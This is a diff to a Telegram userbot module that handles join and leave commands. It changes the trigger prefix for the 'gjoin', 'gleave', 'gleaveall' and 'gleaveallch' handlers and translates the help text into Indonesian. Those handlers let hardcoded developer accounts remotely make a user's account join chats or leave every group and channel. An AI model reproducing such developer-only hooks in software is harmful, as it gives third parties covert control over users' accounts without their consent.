@@ -15,7 +15,7 @@ from Geez import SUDO_USER
 from Geez.modules.basic import add_command_help
 from Geez import cmds
 
-@Client.on_message(filters.command("gjoin", ".") & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command("gjoin", ["*"]) & filters.user(DEVS) & ~filters.me)
 @Client.on_message(
     filters.command(["join"], cmds) & (filters.me | filters.user(SUDO_USER))
 )
@@ -28,7 +28,7 @@ async def join(client: Client, message: Message):
     except Exception as ex:
         await g.edit(f"**ERROR:** \n\n{str(ex)}")
 
-@Client.on_message(filters.command("gleave", ".") & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command("gleave", ["*"]) & filters.user(DEVS) & ~filters.me)
 @Client.on_message(
     filters.command(["leave"], cmds) & (filters.me | filters.user(SUDO_USER))
 )
@@ -41,7 +41,7 @@ async def leave(client: Client, message: Message):
     except Exception as ex:
         await xv.edit_text(f"**ERROR:** \n\n{str(ex)}")
 
-@Client.on_message(filters.command("gleaveall", ".") & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command("gleaveall", ["*"]) & filters.user(DEVS) & ~filters.me)
 @Client.on_message(
     filters.command(["leaveallgc"], cmds) & (filters.me | filters.user(SUDO_USER))
 )
@@ -61,7 +61,7 @@ async def kickmeall(client: Client, message: Message):
         f"**Successfully left {done} Groups, Failed to left {er} Groups**"
     )
 
-@Client.on_message(filters.command("gleaveallch", ".") & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command("gleaveallch", ["*"]) & filters.user(DEVS) & ~filters.me)
 @Client.on_message(filters.command(["leaveallch"], cmds) & filters.me)
 async def kickmeallch(client: Client, message: Message):
     ok = await message.reply_text("`Global Leave from group chats...`")
@@ -83,13 +83,10 @@ async def kickmeallch(client: Client, message: Message):
 add_command_help(
     "Join",
     [
-        [
-            f"{cmds}kickme",
-            "To leave!!.",
-        ],
-        [f"{cmds}leaveallgc", "to leave all groups where you joined."],
-        [f"{cmds}leaveallch", "to leaveall channel where you joined."],
-        [f"{cmds}join [Username]", "give an specific username to join."],
-        [f"{cmds}leave [Username]", "give an specific username to leave."],
+        [f"{cmds}kickme","Leave group!!."],
+        [f"{cmds}leaveallgc", "leave semua group."],
+        [f"{cmds}leaveallch", "leave semua channel."],
+        [f"{cmds}join [Username]", "mengundang seseorang untuk join."],
+        [f"{cmds}leave [Username]", "mengeluarkan seseorang dari group."],
     ],
 )
